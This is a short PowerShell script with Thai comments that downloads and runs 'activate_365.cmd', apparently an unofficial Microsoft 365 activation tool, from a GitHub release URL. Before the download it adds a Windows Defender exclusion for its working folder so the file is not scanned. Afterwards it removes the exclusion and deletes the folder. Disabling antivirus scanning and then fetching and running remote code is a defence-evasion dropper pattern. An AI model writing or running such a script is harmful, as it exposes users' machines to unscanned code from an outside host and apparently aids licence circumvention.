# 1. กำหนดค่าพื้นฐาน
$workDir = "C:\phwyverysad"
$url = "https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/activate_365.cmd"
$fileName = "activate_365.cmd"
$filePath = Join-Path $workDir $fileName

# 2. สร้างโฟลเดอร์ทำงาน (ถ้ายังไม่มี)
if (!(Test-Path $workDir)) {
    New-Item -Path $workDir -ItemType Directory -Force | Out-Null
}

# 3. เพิ่ม Exclusion เพื่อไม่ให้ Windows Defender สแกนหรือลบไฟล์ในโฟลเดอร์นี้
Write-Host "Configuring exclusion for $workDir..." -ForegroundColor Cyan
Add-MpPreference -ExclusionPath $workDir

# 4. ดาวน์โหลดไฟล์โดยใช้ .NET (System.Net.WebClient)
Write-Host "Downloading $fileName..." -ForegroundColor Cyan
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $filePath)
}
catch {
    Write-Host "Download failed: $_" -ForegroundColor Red
    exit
}

# 5. สั่งรันไฟล์ .cmd และรอจนกว่าจะปิดตัวลง
if (Test-Path $filePath) {
    Write-Host "Running $fileName and waiting for it to close..." -ForegroundColor Yellow
    $process = Start-Process -FilePath $filePath -Wait -PassThru
    
    # 6. เมื่อไฟล์ .cmd ปิดตัวลง ให้ทำการลบโฟลเดอร์ทิ้งทันที
    Write-Host "Cleaning up... deleting $workDir" -ForegroundColor Green
    
    # ลบ Exclusion ออก (ถ้าต้องการคืนค่าความปลอดภัย)
    Remove-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
    
    # ลบโฟลเดอร์และเนื้อหาภายในทั้งหมดแบบ Force
    Remove-Item -Path $workDir -Recurse -Force
    Write-Host "All processes completed successfully." -ForegroundColor White
}
else {
    Write-Host "Error: File could not be found at $filePath" -ForegroundColor Red
}
